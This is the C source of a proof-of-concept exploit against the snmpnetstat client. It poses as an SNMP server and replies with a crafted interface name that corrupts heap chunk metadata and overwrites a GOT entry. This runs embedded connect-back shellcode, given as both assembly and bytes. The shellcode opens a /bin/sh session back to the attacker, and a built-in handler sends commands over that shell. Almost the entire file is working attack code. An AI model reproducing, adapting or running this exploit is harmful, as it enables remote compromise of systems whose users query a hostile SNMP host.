
/*
 * Proof of concept xploit for snmpnetstat  
 *
 *  This causes snmpnetstat to overwrite the GOT entry
 * of endprotoent with the address of a connect-back
 * shellcode. The shellcode has some size limitations.
 *
 *  USE THIS AT YOUR OWN RISK
 *
 *  Send comments to Juan M. de la Torre / jmtorre@axiomasistemas.com
 *  http://www.axiomasistemas.com
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/poll.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <getopt.h>

/*
 * Constants
 */
#define ASN_SEQUENCE      0x10
#define ASN_CONSTRUCTOR   0x20
#define ASN_INTEGER       0x02
#define ASN_OCTET_STRING  0x04
#define ASN_CONTEXT       0x80
#define ASN_OBJECTID      0x06

#define SNMP_GETREQUEST     (ASN_CONSTRUCTOR | ASN_CONTEXT)
#define SNMP_GETNEXTREQUEST (ASN_CONSTRUCTOR | ASN_CONTEXT | 0x1)
#define SNMP_GETRESPONSE    (ASN_CONSTRUCTOR | ASN_CONTEXT | 0x2)

enum exploit_states 
{ 
	STATE_LISTENING, STATE_QUITTING, STATE_WAITING_GETNEXT1,
	STATE_WAITING_GETNEXT2, STATE_WAITING_CONNECT
};

/*
 * Globals (I know globals sucks, but...)
 */
static int state;
static int session_id;
static struct sockaddr_in client;
static unsigned short bindport = 3234;
static int use_bind_addr = 0;
static unsigned long bind_addr;

/*
 * 101 bytes connect-back shellcode 
        xorl %eax, %eax
        pushl %eax            # push IPPROTO_IP
        inc %eax
        pushl %eax            # push SOCK_STREAM
        inc %eax
        jmp skip
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
skip:
        pushl %eax           # push AF_INET
        movl %esp, %ecx
        xorl %ebx, %ebx
        movb $0x1, %bl       # SYS_SOCKET
        movb $102, %al       # __NR_socketcall
        int $0x80
        movl %eax, %edx      # save fd in eax and edx
        movb $0x3, %bl       # SYS_CONNECT
        movl %eax, (%ebp)    # put fd as first argument
        pushl $0x0100007f    # fill struct sockaddr_in
        pushl $0x01010002
        movl %esp, 0x4(%ebp)
        movb $16, %al        # sizeof struct sockaddr_in
        movl %eax, 0x8(%ebp)
        movl %ebp, %ecx
        movb $102, %al       # __NR_socketcall
        int $0x80
        decb %bl # %ebx contains '2'
        movzbl %dl, %ecx
loop1:
        movb $6, %al         # __NR_close
        int $0x80
        xchgb %cl, %bl
        movb $63, %al        # __NR_dup2
        int $0x80
        xchgb %cl, %bl
        decb %bl
        jge loop1
        pushl $0x0068732f
        pushl $0x6e69622f
        movl %esp, %ebx
        xorl %edx, %edx
        pushl %edx
        pushl %ebx
        movl %esp, %ecx
        movb $0xb, %al       # __NR_execve
        int $0x80
 */
static u_char shellcode[] = {
        0x31, 0xc0, 0x50, 0x40, 0x50, 0x40, 0xeb, 0x08, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x50, 0x89, 0xe1, 0x31, 0xdb, 0xb3,
        0x01, 0xb0, 0x66, 0xcd, 0x80, 0x89, 0xc2, 0xb3, 0x03, 0x89, 0x45,
        0x00, 0x68, 0x7f, 0x00, 0x00, 0x01, 0x68, 0x02, 0x00, 0x01, 0x01,
        0x89, 0x65, 0x04, 0xb0, 0x10, 0x89, 0x45, 0x08, 0x89, 0xe9, 0xb0,
        0x66, 0xcd, 0x80, 0xfe, 0xcb, 0x0f, 0xb6, 0xca, 0xb0, 0x06, 0xcd,
        0x80, 0x86, 0xcb, 0xb0, 0x3f, 0xcd, 0x80, 0x86, 0xcb, 0xfe, 0xcb,
        0x7d, 0xf0, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68, 0x2f, 0x62, 0x69,
        0x6e, 0x89, 0xe3, 0x31, 0xd2, 0x52, 0x53, 0x89, 0xe1, 0xb0, 0x0b,
        0xcd, 0x80
};

static void __attribute__ ((noreturn))
fatal (u_char *fmt, ...)
{
	va_list ap;

	va_start (ap, fmt);
	vfprintf (stderr, fmt, ap);
	va_end (ap);

	exit (EXIT_FAILURE);
}

/*
 * ASN.1 code
 */
static u_char *
asn_append_len (u_char *pkt, int len)
{
	if (len <= 0x7f)
	{
		/* short len */
		*pkt++ = (u_char) len;
		return (pkt);
	}

	if (len <= 0xff)
	{
		*pkt++ = 0x81;
		*pkt++ = (u_char) (len);
		return (pkt);
	}

	*pkt++ = 0x82;
	*pkt++ = (u_char) ((len & 0xff00) >> 8);
	*pkt++ = (u_char) (len & 0xff);

	return (pkt);
}

static u_char *
asn_append_sequence (u_char *pkt, int len)
{
	*pkt++ = (ASN_SEQUENCE | ASN_CONSTRUCTOR);
	pkt = asn_append_len (pkt, len);
	return (pkt);
}

static u_char *
asn_append_objectid (u_char *pkt, u_char *str, int nlen)
{
	int i = 0;
	
	*pkt++ = ASN_OBJECTID;
	pkt = asn_append_len (pkt, nlen);
	
	while (nlen--)
		*pkt++ = str[i++];

	return (pkt);
}

static u_char *
asn_append_octet_string (u_char *pkt, u_char *str, int nlen)
{
	int i = 0;
	
	*pkt++ = ASN_OCTET_STRING;
	pkt = asn_append_len (pkt, nlen);
	
	while (nlen--)
		*pkt++ = str[i++];

	return (pkt);
}

static u_char *
asn_append_integer (u_char *pkt, unsigned long n, int nlen)
{
	if (nlen != 4 && nlen != 2 && nlen != 1)
		fatal ("error: bad nlen in asn_append_integer(): %i\n",
				nlen);

	*pkt++ = ASN_INTEGER;
	*pkt++ = (u_char) (nlen & 0xff);

	switch (nlen)
	{
	case 1:
		*pkt++ = (u_char) (n & 0xff);
		break;

	case 2:
		*pkt++ = (u_char) ((n & 0xff00) >> 8);
		*pkt++ = (u_char) (n & 0xff);
		break;
		
	case 4:
		*pkt++ = (u_char) ((n & 0xff000000) >> 24);
		*pkt++ = (u_char) ((n & 0xff0000) >> 16);
		*pkt++ = (u_char) ((n & 0xff00) >> 8);
		*pkt++ = (u_char) (n & 0xff);
		break;
	}

	return (pkt);
}

static u_char *
asn_get_octet_string (u_char *pkt, u_char *dst)
{
	int len, i = 0;

	if (*pkt++ != ASN_OCTET_STRING)
		fatal ("error: error while talking to client\n");

	len = *pkt++;

	while (len--)
		dst[i++] = *pkt++;

	return (pkt);
}

static u_char *
asn_get_objectid (u_char *pkt, u_char *dst)
{
	int len, i = 0;

	if (*pkt++ != ASN_OBJECTID)
		fatal ("error: error while talking to client\n");

	len = *pkt++;

	while (len--)
		dst[i++] = *pkt++;

	return (pkt);
}

static u_char *
asn_get_integer (u_char *pkt, int *pdst)
{
	int len, nbits, dst;
	
	if (*pkt++ != ASN_INTEGER)
		fatal ("error: error while talking to client\n");

	len = *pkt++;
	if (len != 1 && len != 2 && len != 4)
		fatal ("error: incorrent integer len received from client\n");
		
	switch (len)
	{
	case 4:
		nbits = 24; break;
	case 2:
		nbits = 8; break;
	case 1:
		nbits = 0; break;
	}

	dst = 0;
	while (len--)
	{
		dst |= ((*pkt++) << nbits);
		nbits -= 8;
	}

	*pdst = dst;

	return (pkt);
}

static unsigned long
get_source_addr (struct sockaddr_in *s_in)
{
	int sd, slen;
	struct sockaddr_in me;
	
	if ((sd = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		fatal ("socket(): %s\n", strerror (errno));
	
	if (connect (sd, (struct sockaddr *) s_in, sizeof (struct sockaddr_in)) < 0)
		fatal ("connect(): %s\n", strerror (errno));

	slen = sizeof (me);
	if (getsockname (sd, (struct sockaddr *) &me, &slen) < 0)
		fatal ("getsockname(): %s\n", strerror (errno));

	close (sd);
	
	return ((unsigned long) me.sin_addr.s_addr);
}

typedef struct
{
	unsigned long psize;
	unsigned long size; /* 0x1 -> PREV_INUSE */
	unsigned long fd;
	unsigned long bk;
} chunk_t;

#define PREV_INUSE 0x1

static u_char *
make_evil_str (int *plen)
{
	int len;
	static u_char buf[BUFSIZ];
	chunk_t *c;
	unsigned long *ip;	
	unsigned short *port;

	memset (buf, 0x90, BUFSIZ);

	c = (chunk_t *) (buf - 4);

	/* leave psize of first chunk unused */
	c->size = 0x16UL;
	c->fd = 0x807dbe8;
	c->bk = 0x8050df0 - 8;
	
	c++;
	c->size = 0UL; /* zero PREV_INUSE bit */

	len = 12 + 16 + 14 + sizeof (shellcode);
	memcpy (buf + 16 + 4, shellcode, sizeof (shellcode));

	ip = (unsigned long *) (buf + 16 + 4 + 35);
	*ip = (use_bind_addr ? bind_addr : get_source_addr (&client));

	port = (unsigned short *) (buf + 16 + 4 + 42);
	*port = htons (bindport);

	*plen = len;
	return (buf);
}

/*
 * SNMP code
 */
static void
snmp_waiting_getnext2 (int sd, u_char *buf)
{
	u_char *ptr = buf;
	int version, foo;
	u_char comm[BUFSIZ], resp[BUFSIZ];
	u_char oids[11][BUFSIZ];
	int i, len, evil_str_len;
	u_char *evil_str = NULL;

        if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
                fatal ("error: protocol error\n");

        ptr += 2;

        ptr = asn_get_integer (ptr, &version);
        if (version != 0)
                fatal ("error: client uses a version different from 0\n");

        memset (comm, 0, sizeof (comm));
        ptr = asn_get_octet_string (ptr, comm);

        if (*ptr++ != SNMP_GETNEXTREQUEST)
                fatal ("error: protocol error\n");

        ptr += 2; /* skip len */

        ptr = asn_get_integer (ptr, &session_id);

        ptr = asn_get_integer (ptr, &foo);
        ptr = asn_get_integer (ptr, &foo);

        if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
                fatal ("error: protocol error\n");
        ptr += 2;

	for (i = 0; i < 11; i++)
	{
		if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
			fatal ("error: protocol error\n");
		ptr++;
		ptr = asn_get_objectid (ptr, oids[i]);
		ptr += 2;
	}

        memset (resp, 0, sizeof (resp));
        ptr = resp;
	
	evil_str = make_evil_str (&evil_str_len);

	/* calculate len of the response */
	len = 3 + (2 + strlen (comm)) + 4 + 6 + 3 + 3 + 4;
	len += (11 * 14) + 40 + evil_str_len + 2;

        ptr = asn_append_sequence (ptr, len);
        ptr = asn_append_integer (ptr, 0, 1);
        ptr = asn_append_octet_string (ptr, comm, strlen (comm));
     
	*ptr++ = SNMP_GETRESPONSE;
	/* calculate len of the getresponse PDU */
	len -= (3 + (2 + strlen (comm)) + 4);
	ptr = asn_append_len (ptr, len);

        ptr = asn_append_integer (ptr, session_id, 4);
        ptr = asn_append_integer (ptr, 0, 1);
        ptr = asn_append_integer (ptr, 0, 1);

	/* calculate len of data */
	len -= (6 + 3 + 3 + 4);
        ptr = asn_append_sequence (ptr, len);

	for (i = 0; i < 11; i++)
	{
		len = 12;

		oids[i][9]++;

		switch (oids[i][8])
		{
		case 1: /* ifindex */
			len += 4;
			ptr = asn_append_sequence (ptr, len);
			ptr = asn_append_objectid (ptr, oids[i], 10);
			ptr = asn_append_integer (ptr, 2, 1);
			break;

		case 2: /* ifname */
			len += 3 + evil_str_len;
			ptr = asn_append_sequence (ptr, len);
			ptr = asn_append_objectid (ptr, oids[i], 10);
			ptr = asn_append_octet_string (ptr, evil_str, evil_str_len);
			break;

		case 4: /* ifmtu */
		case 8: /* ifoperstatus */
			len += 4;
			ptr = asn_append_sequence (ptr, len);
			ptr = asn_append_objectid (ptr, oids[i], 10);
			ptr = asn_append_integer (ptr, 2, 2);
			break;

		case 0xb:   /* INUCASTPKTS */
		case 0xc:   /* INNUCASTPKTS */
		case 0xe:   /* INERRORS */
		case 0x11:  /* OUTUCASTPKTS */
		case 0x12:  /* OUTNUCASTPKTS */
		case 0x14:  /* OUTERRORS */
			len += 4;
			ptr = asn_append_sequence (ptr, len);
			ptr = asn_append_objectid (ptr, oids[i], 10);
			*ptr++ = 0x41;
			*ptr++ = 2;
			*ptr++ = 1;
			*ptr++ = 1;
			break;
			
		case 0x15:  /* OUTQLEN */
			len += 3;
			ptr = asn_append_sequence (ptr, len);
			ptr = asn_append_objectid (ptr, oids[i], 10);
			*ptr++ = 0x42;
			*ptr++ = 1;
			*ptr++ = 0;
			break;
		}
	}

        len = (ptr - resp);
	
        if (sendto (sd, resp, len, 0, (struct sockaddr *) &client, sizeof (client)) != len)
                perror ("sendto()"), exit (EXIT_FAILURE);

        state = STATE_WAITING_CONNECT;
}

static void
snmp_waiting_getnext1 (int sd, u_char *buf)
{
	u_char *ptr = buf;
	u_char len;
	int version, foo;
	u_char comm[BUFSIZ], oid1[BUFSIZ], oid2[BUFSIZ], oid3[BUFSIZ];
	u_char resp[BUFSIZ];

	if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
		fatal ("error: protocol error\n");

	len = *ptr++;

	ptr = asn_get_integer (ptr, &version);
	if (version != 0)
		fatal ("error: client uses a version different from 0\n");

	memset (comm, 0, sizeof (comm));
	ptr = asn_get_octet_string (ptr, comm);
		
	if (*ptr++ != SNMP_GETNEXTREQUEST)
		fatal ("error: protocol error\n");

	ptr++; /* skip len */
	
	ptr = asn_get_integer (ptr, &session_id);

	ptr = asn_get_integer (ptr, &foo);
	ptr = asn_get_integer (ptr, &foo);

	if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
		fatal ("error: protocol error\n");
	ptr++;

	if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
		fatal ("error: protocol error\n");
	ptr++;
	ptr = asn_get_objectid (ptr, oid1);
	if (memcmp (oid1, "\x2B\x06\x01\x02\x01\x04\x14\x01\x02\x00\x00\x00\x00", 0x0D) != 0)
		fatal ("error: protocol error\n");
	ptr += 2;

	if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
		fatal ("error: protocol error\n");
	ptr++;
	ptr = asn_get_objectid (ptr, oid2);
	if (memcmp (oid2, "\x2B\x06\x01\x02\x01\x04\x14\x01\x01\x00\x00\x00\x00", 0x0D) != 0)
		fatal ("error: protocol error\n");
	ptr += 2;

	if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
		fatal ("error: protocol error\n");
	ptr++;
	ptr = asn_get_objectid (ptr, oid3);
	if (memcmp (oid3, "\x2B\x06\x01\x02\x01\x04\x14\x01\x03\x00\x00\x00\x00", 0x0D) != 0)
		fatal ("error: protocol error\n");

	memset (resp, 0, sizeof (resp));
	ptr = resp;

	ptr = asn_append_sequence (ptr, 0x54 + 9);
	ptr = asn_append_integer (ptr, 0, 1);
	ptr = asn_append_octet_string (ptr, comm, strlen (comm));
	*ptr++ = SNMP_GETRESPONSE;
	*ptr++ = 0x47 + 9;
	ptr = asn_append_integer (ptr, session_id, 4);
	ptr = asn_append_integer (ptr, 0, 1);
	ptr = asn_append_integer (ptr, 0, 1);
	
	ptr = asn_append_sequence (ptr, 0x39 + 9);
	
	ptr = asn_append_sequence (ptr, 0x11 + 1);
	ptr = asn_append_objectid (ptr, oid1, 0x0D);
	ptr = asn_append_integer (ptr, 1, 1);
	
	ptr = asn_append_sequence (ptr, 0x11 + 4);
	ptr = asn_append_objectid (ptr, oid2, 0x0D);
	ptr = asn_append_integer (ptr, 0xaabbccdd, 4);
	
	ptr = asn_append_sequence (ptr, 0x11 + 4);
	ptr = asn_append_objectid (ptr, oid3, 0x0D);
	ptr = asn_append_integer (ptr, 0xaabbccdd, 4);
	
	len = (ptr - resp);

	if (sendto (sd, resp, len, 0, (struct sockaddr *) &client, sizeof (client)) != len)
		perror ("sendto()"), exit (EXIT_FAILURE);

	state = STATE_WAITING_GETNEXT2;
}

static void
snmp_listening (int sd, u_char *buf)
{
	u_char *ptr = buf;
	u_char len;
	int version, foo;
	u_char comm[BUFSIZ], oid[BUFSIZ];
	u_char resp[BUFSIZ];
	
	if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
		fatal ("error: protocol error\n");

	len = *ptr++;

	ptr = asn_get_integer (ptr, &version); 
	if (version != 0)
		fatal ("error: client uses a version different from 0\n");

	memset (comm, 0, sizeof (comm));
	ptr = asn_get_octet_string (ptr, comm);
		
	if (*ptr++ != SNMP_GETREQUEST)
		fatal ("error: protocol error\n");

	ptr++; /* skip len */

	ptr = asn_get_integer (ptr, &session_id);
	ptr = asn_get_integer (ptr, &foo);
	ptr = asn_get_integer (ptr, &foo);

	if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
		fatal ("error: protocol error\n");
	ptr++;
	if (*ptr++ != (ASN_SEQUENCE | ASN_CONSTRUCTOR))
		fatal ("error: protocol error\n");
	ptr++;

	ptr = asn_get_objectid (ptr, oid);
	if (memcmp (oid, "\x2B\x06\x01\x02\x01\x02\x01\x00", 8) != 0)
		fatal ("error: protocol error\n");
	
	memset (resp, 0, sizeof (resp));
	ptr = resp;

	ptr = asn_append_sequence (ptr, 42);
	ptr = asn_append_integer (ptr, 0, 1);
	ptr = asn_append_octet_string (ptr, comm, strlen (comm));
	*ptr++ = SNMP_GETRESPONSE;
	*ptr++ = 0x1D;
	ptr = asn_append_integer (ptr, session_id, 4);
	ptr = asn_append_integer (ptr, 0, 1);
	ptr = asn_append_integer (ptr, 0, 1);
	ptr = asn_append_sequence (ptr, 0x0F);
	ptr = asn_append_sequence (ptr, 0x0D);
	ptr = asn_append_objectid (ptr, oid, 8);
	ptr = asn_append_integer (ptr, 1, 1);
	
	len = (ptr - resp);

	if (sendto (sd, resp, len, 0, (struct sockaddr *) &client, sizeof (client)) != len)
		perror ("sendto()"), exit (EXIT_FAILURE);

	state = STATE_WAITING_GETNEXT1;
}

static void
bindshell (int sd)
{
	struct pollfd fds[2];
	u_char *cmds = "pwd; id; uname -a\n";
	u_char buf[BUFSIZ];
	int n;
	
	write (sd, cmds, strlen (cmds));

	while (1)
	{
		memset (&fds, 0, sizeof (fds));

		fds[0].events = fds[1].events = POLLIN;
		fds[0].fd = sd;
		fds[1].fd = 0;

		if (poll (fds, 2, -1) < 0)
			fatal ("poll(): %s\n", strerror (errno));

		if (fds[0].revents & (POLLERR | POLLNVAL | POLLHUP))
			fatal ("connection closed\n");

		if (fds[0].revents & POLLIN)
		{
			n = read (fds[0].fd, buf, BUFSIZ);
			if (n < 1)
				fatal ("connection closed\n");
			write (1, buf, n);
		}
		
		if (fds[1].revents & POLLIN)
		{
			n = read (fds[1].fd, buf, BUFSIZ);
			write (sd, buf, n);
		}
	}
}

static void
snmp_waiting_connect (void)
{
	int sd, val, fsd, slen;
	struct sockaddr_in s_in;
	struct pollfd pfd;
	
	if ((sd = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		fatal ("socket(): %s\n", strerror (errno));

	memset (&s_in, 0, sizeof (s_in));
	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = (use_bind_addr ? bind_addr : INADDR_ANY);
	s_in.sin_port = htons (bindport);

	if (bind (sd, (struct sockaddr *) &s_in, sizeof (s_in)) < 0)
		fatal ("bind(): %s\n", strerror (errno));

	listen (sd, 5);

	fprintf (stderr, "awaiting connection from client...\n");

	memset (&pfd, 0, sizeof (pfd));
	pfd.fd = sd;
	pfd.events = POLLIN;

	if ((val = poll (&pfd, 1, 20 * 1000)) < 0)
		fatal ("poll(): %s\n", strerror (errno));

	if (val < 1 || pfd.revents & (POLLERR | POLLNVAL | POLLHUP) || !(pfd.revents & POLLIN))
		fatal ("no connection from client in 20 seconds. aborting\n");

	memset (&s_in, 0, sizeof (s_in));
	slen = sizeof (s_in);
	fsd = accept (sd, &s_in, &slen);
	close (sd);

	if (fsd < 0)
		fatal ("accept(): %s\n", strerror (errno));

	fprintf (stderr, "received connection from %s:%i\n",
			inet_ntoa (s_in.sin_addr),
			htons (s_in.sin_port));

	bindshell (fsd);
}

static void
snmp_proccess (int sd, u_char *buf)
{
	switch (state)
	{
	case STATE_LISTENING:
		snmp_listening (sd, buf);
		break;

	case STATE_WAITING_GETNEXT1:
		snmp_waiting_getnext1 (sd, buf);
		break;

	case STATE_WAITING_GETNEXT2:
		snmp_waiting_getnext2 (sd, buf);
		break;
	}
}

static void __attribute__ ((noreturn))
usage (u_char *p)
{
	fprintf (stderr, "Usage: %s [options]\n", p);
	fprintf (stderr, "options:\n"
			"-p <port>\tsnmp port to listen on\n"
			"-P <port>\tconnect-back port\n"
			"-a <ip>\t\tbind socket to this address\n"
			"-h\t\tshow this\n\n");
	exit (EXIT_FAILURE);
}

int
main (int argc, char *argv[])
{
	int sd, slen;
	struct sockaddr_in s_in;
	u_char buf[BUFSIZ];
	unsigned short snmp_port = 161;
	unsigned long snmp_ip = INADDR_ANY;
	char opt;
	
	fprintf (stderr, "\nproof of concept snmpnetstat xploit - Juan M. de la Torre <jmtorre@axiomasistemas.com>\n\n");

	while ((opt = getopt (argc, argv, "p:P:a:h")) != EOF)
		switch (opt)
		{
		case 'p':
			snmp_port = atoi (optarg);
			break;

		case 'P':
			bindport = atoi (optarg);
			break;
		
		case 'a':
			if (inet_aton (optarg, (struct in_addr *) &snmp_ip) == 0)
				fatal ("%s is not a valid ip address\n", optarg);
			bind_addr = snmp_ip;
			use_bind_addr = 1;
			break;
		
		case 'h': /* fallthrough */
		default:
			usage (argv[0]);
		}

	fprintf (stderr, "use -h to show usage\n");

	if ((sd = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		perror ("socket()"), exit (EXIT_FAILURE);

	memset (&s_in, 0, sizeof (s_in));
	s_in.sin_family = AF_INET;
	s_in.sin_port = htons (snmp_port);
	s_in.sin_addr.s_addr = snmp_ip;

	if (bind (sd, (struct sockaddr *) &s_in, sizeof (s_in)) < 0)
		perror ("bind()"), exit (EXIT_FAILURE);

	state = STATE_LISTENING;

	fprintf (stderr, "bound socket to %s:%i\n", inet_ntoa (s_in.sin_addr), snmp_port);

	while (1)
	{
		memset (buf, 0, sizeof (buf));
		slen = sizeof (client);
		if (recvfrom (sd, buf, sizeof (buf), 0, (struct sockaddr *) &client, &slen) < 1)
			perror ("recvfrom()"), exit (EXIT_FAILURE);

		fprintf (stderr, "procesing snmp packet from %s:%i\n",
				inet_ntoa (client.sin_addr),
				htons (client.sin_port));

		snmp_proccess (sd, buf);

		if (state == STATE_QUITTING)
			break;

		if (state == STATE_WAITING_CONNECT)
		{
			snmp_waiting_connect ();
			break;
		}
	}

	close (sd);
	
	exit (EXIT_SUCCESS);
}


